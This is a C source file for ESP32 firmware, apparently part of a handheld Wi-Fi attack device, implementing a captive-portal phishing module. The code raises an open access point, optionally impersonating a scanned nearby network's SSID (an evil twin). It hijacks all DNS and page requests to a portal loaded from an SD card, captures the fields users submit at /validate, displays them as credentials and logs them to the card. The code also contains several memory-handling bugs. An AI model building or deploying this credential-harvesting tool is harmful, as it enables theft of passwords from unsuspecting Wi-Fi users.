#include <dirent.h>
#include <sys/param.h>
#include "animations_task.h"
#include "captive_screens.h"
#include "dns_server.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "files_ops.h"
#include "general_animations.h"
#include "lwip/inet.h"
#include "nvs_flash.h"
#include "sd_card.h"

#include "captive_module.h"

#define MININO_CAPTIVE_DEFAULT_SSID CONFIG_WIFI_AP_NAME
#define MININO_CAPTIVE_DEFAULT_PASS ""
#define MININO_CAPTIVE_MAX_STA_CONN 4

extern const char root_start[] asm("_binary_root_html_start");
extern const char root_end[] asm("_binary_root_html_end");

static const char* TAG = "example";

static char* wifi_list[30];

static const char* modes_menu[] = {"Standalone", "Replicate"};
static const char* config_dump_menu[] = {"Dump to SD", "No dump"};

static uint16_t last_index_selected = 0;
static httpd_handle_t server = NULL;

typedef enum {
  PORTALS,
  MODE,
  PREFERENCE,
  RUN,
  HELP,
} main_menu_items_t;

typedef enum { STANDALONE, REPLICATE } mode_types_t;

typedef struct {
  mode_types_t mode;
  char* portal[48];
} captive_context_t;

typedef struct {
  char* user1;
  char* user2;
  char* user3;
  char* user4;
} user_input_t;

typedef struct {
  char* ent[CAPTIVE_PORTAL_LIMIT_PORTALS];
  uint16_t count;
} captive_files_t;

static captive_files_t portals_list = {0};
static captive_context_t captive_context = {0};
static wifi_scanner_ap_records_t* ap_records;
static uint8_t selected_record = 0;
static user_input_t user_context = {
    .user1 = "",
    .user2 = "",
    .user3 = "",
    .user4 = "",
};

static void captive_module_show_running();

static void captive_module_free_portals_list(void) {
  for (int i = 0; i < portals_list.count; i++) {
    free(portals_list.ent[i]);
    portals_list.ent[i] = NULL;
  }
  portals_list.count = 0;
}

static void wifi_init_softap(void) {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  wifi_config_t wifi_config = {
      .ap = {.ssid = MININO_CAPTIVE_DEFAULT_SSID,
             .ssid_len = strlen(MININO_CAPTIVE_DEFAULT_SSID),
             .password = MININO_CAPTIVE_DEFAULT_PASS,
             .max_connection = MININO_CAPTIVE_MAX_STA_CONN,
             .authmode = WIFI_AUTH_WPA_WPA2_PSK},
  };

  if (preferences_get_int(CAPTIVE_PORTAL_MODE_FS_KEY, 0) == 1) {
    char* wifi_ssid =
        malloc(strlen((char*) ap_records->records[selected_record].ssid) + 2);
    strcpy(wifi_ssid, (char*) ap_records->records[selected_record].ssid);
    wifi_ssid[strlen((char*) ap_records->records[selected_record].ssid)] = ' ';
    wifi_ssid[strlen((char*) ap_records->records[selected_record].ssid) + 1] =
        '\0';

    strncpy((char*) wifi_config.ap.ssid, wifi_ssid, strlen(wifi_ssid));
    wifi_config.ap.ssid[strlen(wifi_ssid)] = '\0';
    wifi_config.ap.ssid_len = strlen(wifi_ssid);

    free(wifi_ssid);
  }

  if (strlen(MININO_CAPTIVE_DEFAULT_PASS) == 0) {
    wifi_config.ap.authmode = WIFI_AUTH_OPEN;
  }

  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
  ESP_ERROR_CHECK(esp_wifi_start());

  esp_netif_ip_info_t ip_info;
  esp_netif_get_ip_info(
      esp_netif_get_handle_from_ifkey(CAPTIVE_PORTAL_NET_NAME), &ip_info);

  char ip_addr[16];
  inet_ntoa_r(ip_info.ip.addr, ip_addr, 16);
  ESP_LOGI(TAG, "Set up softAP with IP: %s", ip_addr);
}

static void captive_module_show_default_portal(httpd_req_t* req) {
  const uint32_t root_len = root_end - root_start;
  httpd_resp_send(req, root_start, root_len);
}

// HTTP GET Handler
static esp_err_t captive_portal_root_get_handler(httpd_req_t* req) {
  esp_err_t err = ESP_OK;

  if (sd_card_is_not_mounted()) {
    err = sd_card_mount();
    if (err != ESP_OK) {
      ESP_LOGE("CAPTIVE", "ERROR mounting the SD card");
      sprintf(captive_context.portal, "Default");
      captive_module_show_default_portal(req);
      return ESP_OK;
    }
  }
  httpd_resp_set_type(req, "text/html");

  if (strcmp(captive_context.portal, CAPTIVE_PORTAL_DEFAULT_NAME) == 0) {
    captive_module_show_default_portal(req);
    return ESP_OK;
  }

  char* path = (char*) malloc(1024);
  if (!path) {
    ESP_LOGE("CAPTIVE", "Failed allocate memory for path");
    httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                        "Memory allocation failed");
    return ESP_FAIL;
  }

  sprintf(path, "%s/%s/%s", SD_CARD_PATH, CAPTIVE_PORTAL_PATH_NAME,
          (char*) captive_context.portal);

  FILE* file = fopen(path, "r");
  if (file == NULL) {
    ESP_LOGE(TAG, "Failed to open file for reading");
    captive_module_show_default_portal(req);
    free(path);
    return ESP_FAIL;
  }

  char buffer[512];
  size_t bytes_read;

  while ((bytes_read = fread(buffer, 1, sizeof(buffer) - 1, file)) > 0) {
    buffer[bytes_read] = '\0';
    if (httpd_resp_sendstr_chunk(req, buffer) != ESP_OK) {
      ESP_LOGE(TAG, "Failed to send chunk");
      err = ESP_FAIL;
      break;
    }
  }
  if (ferror(file) && err == ESP_OK) {
    ESP_LOGE(TAG, "Error reading file");
    httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                        "File read error");
    err = ESP_FAIL;
  }

  fclose(file);
  free(path);

  if (err == ESP_OK) {
    httpd_resp_sendstr_chunk(req, NULL);
  }

  return ESP_OK;
}

static void captive_module_show_user_creds(char* user_str) {
  general_notification_ctx_t notification = {0};
  notification.duration_ms = 4000;
  notification.head = "User Info";
  notification.body = user_str;
  general_notification(notification);
  captive_module_show_running();
}

static esp_err_t captive_portal_validate_input(httpd_req_t* req) {
  char* buf;
  char* str_dump[128];

  size_t buf_len = httpd_req_get_url_query_len(req) + 1;
  if (buf_len > 1) {
    buf = (char*) malloc(buf_len);
    if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
      char param[64];
      if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT1, param,
                                sizeof(param)) == ESP_OK) {
        printf("Found URL query parameter -> user1: %s\n", param);
        user_context.user1 = strdup(param);
      }
      if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT2, param,
                                sizeof(param)) == ESP_OK) {
        printf("Found URL query parameter -> user2: %s\n", param);
        user_context.user2 = strdup(param);
      }
      if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT3, param,
                                sizeof(param)) == ESP_OK) {
        printf("Found URL query parameter -> user3: %s\n", param);
        user_context.user3 = strdup(param);
      }
      if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT4, param,
                                sizeof(param)) == ESP_OK) {
        printf("Found URL query parameter -> user4: %s\n", param);
        user_context.user4 = strdup(param);
      }
      sprintf(str_dump, "\nuser1: %s\nuser2: %s\nuser3: %s\nuser4: %s\n\n",
              user_context.user1, user_context.user2, user_context.user3,
              user_context.user4);
      captive_module_show_user_creds(str_dump);
    }
    free(buf);
  }

  if (preferences_get_int(CAPTIVE_PORTAL_PREF_FS_KEY, 0) == 0) {
    if (!sd_card_is_not_mounted()) {
      sd_card_create_dir(CAPTIVE_DATA_PATH);
      sd_card_create_file(CAPTIVE_DATA_FILENAME);
      sd_card_append_to_file(CAPTIVE_DATA_FILENAME, str_dump);
    }
  }

  httpd_resp_set_status(req, "200 Done");
  httpd_resp_set_hdr(req, "Location", "/");
  httpd_resp_send(req, "Thanks for you data", HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}

static const httpd_uri_t root = {.uri = "/",
                                 .method = HTTP_GET,
                                 .handler = captive_portal_root_get_handler};

static const httpd_uri_t get_creds = {.uri = "/validate",
                                      .method = HTTP_GET,
                                      .handler = captive_portal_validate_input};

esp_err_t http_404_error_handler(httpd_req_t* req, httpd_err_code_t err) {
  httpd_resp_set_status(req, "302 Temporary Redirect");
  httpd_resp_set_hdr(req, "Location", "/");
  httpd_resp_send(req, "Redirect to the captive portal", HTTPD_RESP_USE_STRLEN);

  return ESP_OK;
}

static httpd_handle_t start_webserver(void) {
  httpd_handle_t server = NULL;
  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.max_open_sockets = 6;  // More than 6 will mark as error and don't work
  config.lru_purge_enable = true;

  if (httpd_start(&server, &config) == ESP_OK) {
    httpd_register_uri_handler(server, &root);
    httpd_register_uri_handler(server, &get_creds);
    httpd_register_err_handler(server, HTTPD_404_NOT_FOUND,
                               http_404_error_handler);
  }
  return server;
}

static void captive_module_disable_wifi() {
  ESP_ERROR_CHECK(esp_wifi_stop());
  ESP_ERROR_CHECK(esp_wifi_deinit());
  esp_netif_t* netif = esp_netif_get_handle_from_ifkey(CAPTIVE_PORTAL_NET_NAME);
  if (netif) {
    esp_netif_destroy(netif);
    ESP_LOGW("CAPTIVE", "Netif destroyed");
  }
  if (server) {
    httpd_stop(server);
    ESP_LOGW("CAPTIVE", "HTTP server stopped");
  }

  ESP_ERROR_CHECK(esp_event_loop_delete_default());
  captive_module_main();
}

static void captive_module_wifi_begin() {
  esp_log_level_set("httpd_uri", ESP_LOG_ERROR);
  esp_log_level_set("httpd_txrx", ESP_LOG_ERROR);
  esp_log_level_set("httpd_parse", ESP_LOG_ERROR);

  ESP_ERROR_CHECK(esp_netif_init());
  esp_err_t errr = esp_event_loop_create_default();
  if (errr != ESP_OK) {
    ESP_LOGE(TAG_WIFI_SCANNER_MODULE, "Failed to create event loop: %s",
             esp_err_to_name(errr));
    esp_event_loop_delete_default();
    esp_event_loop_create_default();
  }
  ESP_ERROR_CHECK(nvs_flash_init());

  esp_netif_create_default_wifi_ap();
  wifi_init_softap();
  server = start_webserver();

  dns_server_config_t config = DNS_SERVER_CONFIG_SINGLE(
      "*" /* all A queries */, "WIFI_AP_DEF" /* softAP netif ID */);
  start_dns_server(&config);

  if (sd_card_is_not_mounted()) {
    sprintf(captive_context.portal, "Default");
    return;
  }

  esp_err_t err =
      preferences_get_string(CAPTIVE_PORTAL_FS_KEY, captive_context.portal,
                             CAPTIVE_PORTAL_MAX_DEFAULT_LEN);
  if (err != ESP_OK) {
    ESP_LOGE("CAPTIVE", "ERROR reading the file name");
    sprintf(captive_context.portal, CAPTIVE_PORTAL_DEFAULT_NAME);
  }
}

static uint16_t captive_module_get_sd_items() {
  esp_err_t err;
  if (sd_card_is_not_mounted()) {
    err = sd_card_mount();
    if (err != ESP_OK) {
      ESP_LOGE("CAPTIVE", "ERROR mounting the SD card");
      return 0;
    }
  }

  char* path = (char*) malloc(CAPTIVE_PORTAL_MAX_DEFAULT_LEN);
  snprintf(path, CAPTIVE_PORTAL_MAX_DEFAULT_LEN, "%s/%s", SD_CARD_PATH,
           CAPTIVE_PORTAL_PATH_NAME);
  DIR* dir;
  dir = opendir(path);
  if (dir == NULL) {
    ESP_LOGE("CAPTIVE", "ERROR opening the SD card");
    free(path);
    return 0;
  }

  captive_module_free_portals_list();

  struct dirent* ent;
  rewinddir(dir);
  portals_list.count = 0;
  while ((ent = readdir(dir)) != NULL) {
    if (ent->d_name[0] == '.') {
      continue;
    }
    portals_list.ent[portals_list.count] = (char*) malloc(strlen(ent->d_name));
    if (!portals_list.ent[portals_list.count]) {
      ESP_LOGE("CAPTIVE", "Failed to allocate memory for dirent name");
      continue;
    }
    strcpy(portals_list.ent[portals_list.count], ent->d_name);
    portals_list.count++;
  }

  free(path);
  closedir(dir);
  return portals_list.count;
}

static void captive_module_mode_selector_handle(uint8_t option) {
  preferences_put_int(CAPTIVE_PORTAL_MODE_FS_KEY, option);
}

static void captive_module_show_mode_selector() {
  general_radio_selection_menu_t modes = {0};
  modes.banner = "Modes";
  modes.options = (char**) modes_menu;
  modes.options_count = sizeof(modes_menu) / sizeof(char*);
  modes.select_cb = captive_module_mode_selector_handle;
  modes.style = RADIO_SELECTION_OLD_STYLE;
  modes.exit_cb = captive_module_main;
  modes.current_option = preferences_get_int(CAPTIVE_PORTAL_MODE_FS_KEY, 0);
  general_radio_selection(modes);  // Show the radio menu
}

static void captive_module_preference_selector_handle(uint8_t option) {
  preferences_put_int(CAPTIVE_PORTAL_PREF_FS_KEY, option);
}

static void captive_module_show_preference_selector() {
  general_radio_selection_menu_t preferences = {0};
  preferences.banner = "Preferences";
  preferences.options = (char**) config_dump_menu;
  preferences.options_count = sizeof(config_dump_menu) / sizeof(char*);
  preferences.select_cb = captive_module_preference_selector_handle;
  preferences.style = RADIO_SELECTION_OLD_STYLE;
  preferences.exit_cb = captive_module_main;
  preferences.current_option =
      preferences_get_int(CAPTIVE_PORTAL_PREF_FS_KEY, 0);
  general_radio_selection(preferences);  // Show the radio menu
}

static void captive_module_show_running() {
  char* body[64];
  sprintf(body, "Using:%s | Waiting for user creds",
          (char*) captive_context.portal);

  general_notification_ctx_t notification = {0};
  notification.head = "Captive Portal";
  notification.body = body;
  notification.on_exit = captive_module_disable_wifi;
  general_notification_handler(notification);
}

static void captive_module_selector_handler(uint8_t option) {
  preferences_put_string(CAPTIVE_PORTAL_FS_KEY, portals_list.ent[option]);
  sprintf(captive_context.portal, portals_list.ent[option]);
  captive_module_main();
}

static void captive_module_sd_show_items() {
  captive_module_get_sd_items();
  if (portals_list.count < CAPTIVE_PORTAL_LIMIT_PORTALS &&
      portals_list.count == 0) {
    portals_list.ent[portals_list.count] = strdup(CAPTIVE_PORTAL_DEFAULT_NAME);
    if (portals_list.ent[portals_list.count]) {
      portals_list.count++;
    } else {
      ESP_LOGE("CAPTIVE", "Failed to allocate memory for default portal");
    }
  }

  general_submenu_menu_t portals = {0};
  portals.options = (char**) portals_list.ent;
  portals.options_count = portals_list.count;
  portals.select_cb = captive_module_selector_handler;
  portals.selected_option = 0;
  portals.exit_cb = captive_module_main;
  general_submenu(portals);
}

static void captive_module_ap_list_handler(uint8_t option) {
  ESP_LOGI("CAPTIVE", "AP Selected: %s", ap_records->records[option].ssid);
  selected_record = option;
  captive_module_wifi_begin();
  captive_module_show_running();
}

static void captive_module_scan_clean() {
  if (!ap_records)
    return;

  for (int i = 0; i < 30; i++) {
    if (wifi_list[i]) {
      free(wifi_list[i]);
      wifi_list[i] = NULL;
    }
  }
  if (ap_records) {
    wifi_scanner_clear_ap_records();
    ap_records->count = 0;
    ap_records = NULL;
  }
}

static void captive_module_get_scanned_ap() {
  if (!ap_records || ap_records->count == 0) {
    ESP_LOGE(TAG, "No valid AP records");
    return;
  }

  for (int i = 0; i < ap_records->count; i++) {
    if (!wifi_list[i]) {
      wifi_list[i] = malloc(sizeof(ap_records->records[i].ssid));
      if (!wifi_list[i]) {
        ESP_LOGE("CAPTIVE", "Error with malloc");
        continue;
      }
    }
    memcpy(wifi_list[i], ap_records->records[i].ssid,
           sizeof(ap_records->records[i].ssid));
  }
}

static void captive_module_clean_records() {
  captive_module_scan_clean();
  captive_module_main();
}

// TODO: Check, this recall can be result in Store access fault)
static void captive_module_show_aps_list() {
  if (ap_records->count == 0) {
    captive_module_show_notification_no_ap_records();
    return;
  }

  captive_module_get_scanned_ap();

  general_submenu_menu_t ap_list = {0};
  ap_list.options = wifi_list;
  ap_list.options_count = ap_records->count - 1;
  ap_list.selected_option = 0;
  ap_list.select_cb = captive_module_ap_list_handler;
  ap_list.exit_cb = captive_module_clean_records;

  general_submenu(ap_list);
}

static void scanning_task() {
  uint8_t scan_count = 0;
  ap_records = wifi_scanner_get_ap_records();
  while (ap_records->count < (DEFAULT_SCAN_LIST_SIZE / 2)) {
    wifi_scanner_module_scan();
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    scan_count++;
  }

  ap_records = wifi_scanner_get_ap_records();

  animations_task_stop();
  captive_module_show_aps_list();

  vTaskDelete(NULL);
}

static void captive_module_run_scan_task() {
  wifi_scanner_ap_records_t* records = wifi_scanner_get_ap_records();
  while (records->count < (DEFAULT_SCAN_LIST_SIZE / 2)) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
}

static void captive_module_main_menu_handler(uint8_t option) {
  switch (option) {
    case PORTALS:
      captive_module_sd_show_items();
      break;
    case MODE:
      captive_module_show_mode_selector();
      break;
    case PREFERENCE:
      captive_module_show_preference_selector();
      break;
    case RUN:
      if (preferences_get_int(CAPTIVE_PORTAL_MODE_FS_KEY, 0) == 1) {
        captive_module_scan_clean();
        xTaskCreate(scanning_task, "wifi_scan", 8096, NULL, 5, NULL);
        animations_task_run(&general_animation_loading, 300, NULL);
        captive_module_run_scan_task();
      } else {
        captive_module_wifi_begin();
        captive_module_show_running();
      }
      break;
    case HELP:
      captive_module_show_help();
      break;
    default:
      break;
  }
}

void captive_module_main(void) {
  general_submenu_menu_t main = {0};
  main.options = captive_main_menu;
  main.options_count = sizeof(captive_main_menu) / sizeof(char*);
  main.select_cb = captive_module_main_menu_handler;
  main.selected_option = last_index_selected;
  main.exit_cb = menus_module_restart;
  general_submenu(main);
}